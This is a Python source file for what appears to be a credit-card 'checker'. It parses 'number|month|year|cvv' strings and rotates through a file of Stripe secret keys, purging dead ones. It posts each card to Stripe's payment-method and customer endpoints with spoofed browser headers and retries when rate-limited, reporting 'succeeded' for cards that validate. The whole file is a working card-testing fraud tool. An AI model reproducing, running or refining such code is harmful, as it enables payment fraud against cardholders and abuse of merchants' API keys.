def create_auth(fullcc):
    import random
    from FUNC.defs import check_stripe
    sks = open("FILES/sks.txt",encoding="UTF-8").read().splitlines()
    try:
        sk = random.choice(sks)
    except IndexError:
        sk = open("FILES/sk.txt",encoding="UTF-8").read()
    if check_stripe(sk)==False:
        open('FILES/sks.txt', 'w',encoding="UTF-8").close()
        amt = 0
        for x in sks:
            if x in sk or x==sk:
                pass
            else:
                amt += 1
                if amt==1:
                    with open("FILES/sks.txt","a",encoding="UTF-8") as f:
                        f.write(x)
                else:
                    with open("FILES/sks.txt","a",encoding="UTF-8") as f:
                        f.write(f"\n{x}")
    else:
        pass
    try:
        import requests
        splitter = fullcc.split("|")
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvv = splitter[3]
        url1 = "https://api.stripe.com/v1/payment_methods"
        headers1 = {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/payment_methods",
    "scheme": "https",
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "authorization": f"Bearer {sk}",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        }
        data1 = f"type=card&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}"
        amt = 0
        while True:
            r1 = requests.post(url1, data=data1, headers=headers1)
            result1 = r1.text
            if "Request rate limit exceeded." in result1:
                amt += 1
                continue
            else:
                if "Invalid API Key provided" in result1 or "testmode_charges_only" in result1 or "api_key_expired" in result1:
                    return result1
                elif "generic_decline" in result1:
                    return result1
                else:
                    try:
                        id = r1.json()["id"]
                    except Exception as e:
                        return result1
                    break
        url2 = "https://api.stripe.com/v1/customers"
        headers2 = {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/customers",
    "scheme": "https",
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "authorization": f"Bearer {sk}",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        }
        data2 = f"description=donation&payment_method={id}"
        amt = 0
        while True:
            r2 = requests.post(url2, data=data2, headers=headers2)
            result2 = r2.text
            if "Request rate limit exceeded." in result2:
                amt += 1
                continue
            else:
                try:
                    cus = r2.json()["id"]
                    return "succeeded"
                except:
                    return result2
                break
    except Exception as e:
        with open("error_logs.txt", "a") as f:
            f.write(f"{e}\n")
